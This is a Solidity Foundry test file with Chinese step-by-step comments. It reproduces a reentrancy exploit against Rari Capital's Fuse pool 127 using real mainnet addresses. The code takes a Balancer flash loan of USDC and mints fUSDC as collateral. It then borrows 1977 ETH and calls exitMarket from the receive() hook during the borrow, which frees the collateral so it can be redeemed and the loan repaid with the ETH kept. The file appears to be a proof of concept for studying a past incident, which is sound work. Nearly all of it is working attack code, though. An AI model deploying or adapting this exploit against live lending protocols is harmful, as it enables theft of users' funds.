// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "ds-test/test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);
}


interface ICEtherDelegate {

    function borrow(uint256 borrowAmount) external returns (uint256);

    function getCash() external view returns (uint256);

    function mint() external payable;

    function balanceOf(address account) external view returns (uint256);


    function transfer(address dst, uint256 amount) external returns (bool);

    function transferFrom(
        address src,
        address dst,
        uint256 amount
    ) external returns (bool);

    function underlying() external view returns (address);
}

interface ICErc20Delegate {

    function approve(address spender, uint256 amount) external returns (bool);


    function borrow(uint256 borrowAmount) external returns (uint256);

    function mint(uint256 mintAmount) external returns (uint256);

    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);


    function accrueInterest() external returns (uint256);

}

interface IUnitroller {

    function enterMarkets(address[] memory cTokens)
    external
    returns (uint256[] memory);

    function exitMarket(address cTokenAddress) external returns (uint256);

    function cTokensByUnderlying(address) external view returns (address);
 
    function getAccountLiquidity(address account)
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );

    function borrowCaps(address) external view returns (uint256);
    


}

interface IBalancerVault {

    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

}

contract ContractTest is DSTest {

    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    ICEtherDelegate fETH_127 = ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));

    ICErc20Delegate fusdc_127 =   ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    
    IUnitroller rari_Comptroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    IBalancerVault  vault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function test() public{

        // 前置准备操作1: 查看 fETH_127 中有多少ETH可以借  
        emit log_named_uint("ETH Balance of fETH_127 before borrowing",address(fETH_127).balance/1e18);

        // 前置准备操作2: 因为forge的测试地址上本身有很多的ETH 
        // 所以先把他们都转走, 方便查看攻击所得ETH数量
        payable(address(0)).transfer(address(this).balance);

        emit log_named_uint("ETH Balance after sending to blackHole",address(this).balance);

        // 第一步, 从balancer中通过闪电贷借1500万的USDC
        // 攻击者其实借了1.5亿, 但其实1500万就可以
        // 但是balancer的闪电贷是不收手续费的, 所以借多少都无所谓

        address[] memory tokens = new address[](1);

        tokens[0] = address(usdc);

        uint[] memory amounts = new uint[](1);

        amounts[0] =  150000000*10**6;

        vault.flashLoan(address(this), tokens, amounts, '');

    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    )
        external
    {
        // 没有下面四行会有恶心的warning
        tokens;
        amounts;
        feeAmounts;
        userData;
        // 查看是否成功借到了1500万的USDC

        uint usdc_balance = usdc.balanceOf(address(this));
        emit log_named_uint("Borrow USDC from balancer",usdc_balance);

        // 第二步, 调用fusdc_127的mint函数, 
        // 完成usdc的质押操作

        usdc.approve(address(fusdc_127), type(uint256).max);

        fusdc_127.accrueInterest();

        fusdc_127.mint(15000000000000);

        uint fETH_Balance = fETH_127.balanceOf(address(this));

        emit log_named_uint("fETH Balance after minting",fETH_Balance);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after minting",usdc_balance);

        // 第三步, 调用 Unitroller 的 enterMarkets函数

        address[] memory ctokens = new address[](1);

        ctokens[0] =  address(fusdc_127);

        rari_Comptroller.enterMarkets(ctokens);

        // 第四步, fETH_127 的borrow函数, 借1977个ETH

        fETH_127.borrow(1977 ether);

        emit log_named_uint("ETH Balance of fETH_127_Pool after borrowing",address(fETH_127).balance/1e18);

        emit log_named_uint("ETH Balance of me after borrowing",address(this).balance/1e18);

        usdc_balance = usdc.balanceOf(address(this));

        fusdc_127.approve(address(fusdc_127), type(uint256).max);

        fusdc_127.redeemUnderlying(15000000000000);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after borrowing",usdc_balance);

        // 第五步, 把1500万的USDC还给balancer

        usdc.transfer(address(vault), usdc_balance);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after repayying",usdc_balance);
    }


    receive() external payable {

        rari_Comptroller.exitMarket(address(fusdc_127));
        emit log_bytes("Reentered Successfully!");

    }



}
